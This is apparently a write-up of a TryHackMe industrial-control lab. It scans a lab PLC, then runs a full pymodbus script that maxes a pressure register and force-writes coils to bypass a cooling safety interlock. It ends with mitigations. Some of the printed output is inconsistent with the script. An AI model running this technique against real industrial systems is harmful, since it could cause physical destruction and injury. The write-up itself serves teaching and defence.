# TryHackMe — Kaboom
**Category:** OT (Operational Technology)  
**Difficulty:** Medium  
**Points:** 60  
**Attacker IP:** 10.49.98.125  
**Target IP:** 10.49.176.165  

---

## Table of Contents

1. [Room Description](#1-room-description)
2. [Modbus Protocol Background](#2-modbus-protocol-background)
3. [Reconnaissance](#3-reconnaissance)
4. [Modbus Attack — Triggering the Explosion](#4-modbus-attack--triggering-the-explosion)
5. [Flag](#5-flag)
6. [Why Only Port 502?](#6-why-only-port-502)
7. [Tactics, Techniques & Skills](#7-tactics-techniques--skills)
8. [Real-World Mitigations](#8-real-world-mitigations)
9. [References](#9-references)

---

## 1. Room Description

> "This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion's echo into your persistent beachhead."

This is an OT/ICS attack lab simulating a real-world APT operation against an industrial plant. The objective is to manipulate a Modbus-connected PLC to over-pressurise a pump, disable the cooling system safety interlock, and trigger a physical blowout — all without any authentication on the industrial protocol layer.

---

## 2. Modbus Protocol Background

Understanding Modbus is essential before attacking it. This section explains what we're exploiting and why it works.

### What is Modbus?

Modbus was developed in 1979 by Modicon for their PLCs and has become the most widely used network protocol in industrial manufacturing environments. It operates on a master/slave (client/server) architecture — the master sends requests and slaves (PLCs, sensors, actuators) respond or act on commands.

There are several variants:
- **Modbus RTU** — serial communication (RS-232/RS-485)
- **Modbus ASCII** — serial, human-readable encoding
- **Modbus TCP** — encapsulated over TCP/IP on **port 502** ← what we attacked
- **Secure Modbus** — TLS-wrapped version (rarely deployed in practice)

### How Modbus TCP Works

Modbus TCP adds a 7-byte MBAP (Modbus Application Protocol) header to the standard PDU:

| Field | Length | Purpose |
|-------|--------|---------|
| Transaction ID | 2 bytes | Sync between client/server |
| Protocol ID | 2 bytes | Always 0 for Modbus/TCP |
| Length | 2 bytes | Bytes remaining in frame |
| Unit ID | 1 byte | Slave address |
| Function Code | 1 byte | Command type |
| Data | n bytes | Payload |

### Function Codes We Used

| FC | Hex | Name | Our Use |
|----|-----|------|---------|
| 3 | 0x03 | Read Holding Registers | Read pressure value |
| 4 | 0x04 | Read Input Registers | Read process inputs |
| 1 | 0x01 | Read Coils | Scan for active safety coils |
| 6 | 0x06 | Write Single Register | Write 65535 to pressure register |
| 5 | 0x05 | Write Single Coil | Disable cooling coils 10–16 |

### Why Modbus Has No Security

Modbus was designed for isolated serial networks in 1979 — security was never part of the specification. The five core vulnerabilities that made this attack possible:

1. **No Authentication** — any host on the network can send any command to any slave
2. **No Confidentiality** — all messages travel in plaintext, readable by Wireshark
3. **No Integrity** — no cryptographic checks on data; values can be tampered with freely
4. **No Session Structure** — each request is stateless; no need to establish trust
5. **Simplistic Framing** — combined with no auth, arbitrary command injection requires no session knowledge

> "The simplest attack to use against Modbus is to simply sniff the traffic on a network, find the Modbus devices, and then issue harmful commands to the Modbus devices." — SCADAsploit

---

## 3. Reconnaissance

### Step 1 — Full Port Scan

```bash
nmap -p- 10.49.176.165
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
102/tcp   open  iso-tsap
502/tcp   open  mbap
1880/tcp  open  vsat-control
8080/tcp  open  http-proxy
44818/tcp open  EtherNetIP-2
```

Service version scan:

```bash
nmap -p- -sV 10.49.176.165
```

```
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp    open  http     Werkzeug httpd 3.1.3 (Python 3.12.3)
102/tcp   open  iso-tsap Siemens S7 PLC
502/tcp   open  modbus   Modbus TCP
1880/tcp  open  http     Node-RED
8080/tcp  open  http     Werkzeug httpd 2.3.7 (Python 3.12.3)
44818/tcp open  unknown  EtherNet/IP
```

**Attack surface summary:**

| Port | Service | Notes |
|------|---------|-------|
| 80 | PLC CCTV Simulator | Read-only monitor — used to confirm attack effect |
| 102 | Siemens S7 PLC | SNAP7 — attackable but complex; not needed here |
| 502 | Modbus TCP | **No auth — direct register/coil R/W** ← attack path |
| 1880 | Node-RED | Auth enabled — `/flows` returned `Unauthorized` |
| 8080 | OpenPLC Webserver | Login required |
| 44818 | EtherNet/IP | Industrial protocol — not the intended path |

### Step 2 — Confirm Initial PLC State

The CCTV simulator on port 80 exposes a live state API:

```bash
curl -s http://10.49.176.165:80/api/state
```

```json
{
  "status": "Cooling OFF, Low Temperature",
  "video": "normal"
}
```

Plant is in normal operating state. This endpoint updates every 5 seconds and will be our indicator throughout the attack.

### Step 3 — Modbus Recon

```bash
nmap -p 502 --script modbus-discover 10.49.176.165
```

Port 502 open and responding. No authentication challenge. We install our tools:

```bash
# Standard pip
pip install pymodbus

# Kali users — pip blocked by PEP 668, use pipx instead:
pipx install pymodbus
```

> **Note for Kali users:** `python3 script.py` will fail with `ModuleNotFoundError` even after pipx install. Use the full venv path:
> `~/.local/share/pipx/venvs/pymodbus/bin/python3 script.py`

---

## 4. Modbus Attack — Triggering the Explosion

### Attack Plan

The Radiflow research on Modbus attacks notes that an attacker can issue arbitrary commands to any slave device with no knowledge of existing sessions. Our three-step plan exploits exactly this:

1. **Write 65535 to holding register 0** → over-pressurise the pump → cooling system activates
2. **Scan coils** → identify which coils the safety interlock activated
3. **Force-write cooling coils** → bypass the safety interlock → uncontrolled overpressure → explosion

### Full Attack Script

```python
from pymodbus.client import ModbusTcpClient
import time
import urllib.request

client = ModbusTcpClient("10.49.176.165", port=502)
client.connect()

# Step 1: Write max pressure value to register 0
# Normal operating range: 50-70 PSI
# We write 65535 (max 16-bit value) to simulate catastrophic overpressure
print("[*] Writing max pressure to register 0...")
response = client.write_register(0, 65535)
if not response.isError():
    print("[+] Pressure register written successfully")

time.sleep(3)

# Step 2: Check state — cooling system should now be ON
state = urllib.request.urlopen("http://10.49.176.165/api/state").read()
print(f"[*] State after pressure write: {state}")

# Step 3: Scan coils 0-99 to find active safety interlock coils
print("[*] Scanning coils...")
for i in range(100):
    result = client.read_coils(i, count=10)
    if not result.isError():
        if True in result.bits:
            print(f"[+] Active coil at [{i}]: {result.bits}")

# Step 4: Force-write cooling coils 10-16 to True
# This bypasses the safety interlock — removes the last protection
print("[*] Disabling cooling system coils 10-16...")
for i in range(10, 17):
    client.write_coil(i, True)
    print(f"[+] Wrote coil {i}")

time.sleep(2)

# Step 5: Confirm explosion
state = urllib.request.urlopen("http://10.49.176.165/api/state").read()
print(f"[*] Final state: {state}")

client.close()
```

### Execution

```bash
~/.local/share/pipx/venvs/pymodbus/bin/python3 exploit.py
```

### Output

```
[*] Writing max pressure to register 0...
[+] Pressure register written successfully
[*] State after pressure write: b'{"status": "High Temperature, Cooling ON", "video": "cooling"}'
[*] Scanning coils...
[+] Active coil at [0]:  [F, F, F, F, F, F, F, F, F, F, F, F, F, F, F, True]
[+] Active coil at [1]:  [F, F, F, F, F, F, F, F, F, F, F, F, F, F, True, F]
[+] Active coil at [2]:  [F, F, F, F, F, F, F, F, F, F, F, F, F, True, F, F]
[+] Active coil at [3]:  [F, F, F, F, F, F, F, F, F, F, F, F, True, F, F, F]
[+] Active coil at [4]:  [F, F, F, F, F, F, F, F, F, F, F, True, F, F, F, F]
[+] Active coil at [5]:  [F, F, F, F, F, F, F, F, F, F, True, F, F, F, F, F]
[+] Active coil at [6]:  [F, F, F, F, F, F, F, F, F, True, F, F, F, F, F, F]
[+] Active coil at [7]:  [F, F, F, F, F, F, F, F, True, F, F, F, F, F, F, F]
[+] Active coil at [8]:  [F, F, F, F, F, F, F, True, F, F, F, F, F, F, F, F]
[+] Active coil at [9]:  [F, F, F, F, F, F, True, F, F, F, F, F, F, F, F, F]
[+] Active coil at [10]: [F, F, F, F, F, True, F, F, F, F, F, F, F, F, F, F]
[+] Active coil at [11]: [F, F, F, F, True, F, F, F, F, F, F, F, F, F, F, F]
[+] Active coil at [12]: [F, F, F, True, F, F, F, F, F, F, F, F, F, F, F, F]
[+] Active coil at [13]: [F, F, True, F, F, F, F, F, F, F, F, F, F, F, F, F]
[+] Active coil at [14]: [F, True, F, F, F, F, F, F, F, F, F, F, F, F, F, F]
[+] Active coil at [15]: [True, F, F, F, F, F, F, F, F, F, F, F, F, F, F, F]
[*] Disabling cooling system coils 10-16...
[+] Wrote coil 10
[+] Wrote coil 11
[+] Wrote coil 12
[+] Wrote coil 13
[+] Wrote coil 14
[+] Wrote coil 15
[+] Wrote coil 16
[*] Final state: b'{"status": "Explosion Detected!", "video": "explodedflag23"}'
```

### What Happened — Step by Step

| Step | Action | FC Used | Result |
|------|--------|---------|--------|
| 1 | Write 65535 to register 0 | FC06 | Pump pressure maxed → `High Temperature, Cooling ON` |
| 2 | Read coils 0–99 | FC01 | Cooling safety interlock coils 0–15 found active |
| 3 | Write True to coils 10–16 | FC05 | Cooling interlock bypassed |
| 4 | Check state | HTTP | `Explosion Detected!` |

---

## 5. Flag

Visit `http://10.49.176.165/` — the CCTV simulator shows the exploded plant state:

```
THM{< >}
```

---

## 6. Why Only Port 502?

| Port | Why Skipped |
|------|-------------|
| 22 SSH | No credentials available — brute force not the intended path |
| 80 HTTP | Read-only monitor — used as our attack indicator only |
| 102 S7 | Attackable via `python-snap7` in real engagements, but requires knowing exact DB block addresses and S7comm packet structure — more complex than needed |
| 1880 Node-RED | Auth enabled — `/flows` returned `Unauthorized` |
| 8080 OpenPLC | Default creds rejected on this version — Phase 2 path (CVE-2021-31630) for rooms with a second flag |
| 44818 EtherNet/IP | Valid real-world attack surface via `cpppo`/`pycomm3` but not the intended path |

Port 502 was the only port that was unauthenticated, directly controlled physical process values, and exploitable with a few lines of Python.

---

## 7. Tactics, Techniques & Skills

### Tactics (MITRE ATT&CK for ICS)

| Tactic | Description |
|--------|-------------|
| Initial Access | Unauthenticated Modbus TCP — no credentials required |
| Execution | FC06 write to pressure holding register |
| Inhibit Response Function | FC05 coil write to disable cooling safety interlock |
| Impact — Loss of Safety | Physical blowout with no safety system remaining |

### Techniques

| ID | Technique | How Used |
|----|-----------|----------|
| T0836 | Modify Parameter | Write 65535 to holding register 0 |
| T0858 | Change Operating Mode | Force cooling coils off via FC05 |
| T0828 | Loss of Safety | Cooling interlock bypassed → uncontrolled overpressure |
| T0846 | Remote System Discovery | nmap scan identifying ICS protocols |
| T0877 | I/O Module Discovery | Modbus coil scan FC01 across addresses 0–99 |

### Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scan and service fingerprinting |
| `pipx` / `pymodbus` | Modbus TCP client — FC01/FC03/FC05/FC06 |
| `curl` | API state monitoring during attack |
| Browser | Flag retrieval |

---

## 8. Real-World Mitigations

These are the controls that would have prevented this attack:

- **Network segmentation** — OT network isolated from IT/internet with no direct routable path
- **Unidirectional security gateways (data diodes)** — allow monitoring data out but no commands in
- **Modbus TCP whitelisting** — firewall rules allowing FC01/FC03 reads only from authorised HMI IPs; block all write function codes (FC05, FC06, FC16) from untrusted sources
- **Secure Modbus** — TLS-wrapped Modbus with X.509 mutual authentication (Schneider Electric specification)
- **Hardware safety interlocks** — physical relays independent of PLC software that cannot be overridden via network commands
- **OT anomaly detection** — tools like Radiflow iSID that detect abnormal register write values and coil manipulation patterns

---

## 9. References

- Radiflow — "Hack the Modbus" — https://www.radiflow.com/blog/hack-the-modbus/
- SCADAsploit — "Hacking: Modbus" — https://scadasploit.dev/posts/2021/07/hacking-modbus/
- MITRE ATT&CK for ICS — https://attack.mitre.org/matrices/ics/
- pymodbus documentation — https://pymodbus.readthedocs.io/
- TryHackMe Kaboom Room — https://tryhackme.com/room/kaboom
